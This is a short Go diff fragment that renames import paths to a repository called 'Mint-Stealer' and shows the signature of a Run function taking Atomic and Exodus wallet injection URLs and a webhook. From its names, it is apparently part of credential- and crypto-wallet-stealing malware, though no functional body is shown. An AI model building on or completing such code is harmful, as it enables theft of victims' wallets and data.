@@ -6,8 +6,8 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/fileutil"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
+	"github.com/0xFl4q/Mint-Stealer/utils/fileutil"
+	"github.com/0xFl4q/Mint-Stealer/utils/hardware"
 )
 
 func Run(atomic_injection_url, exodus_injection_url, webhook string) {
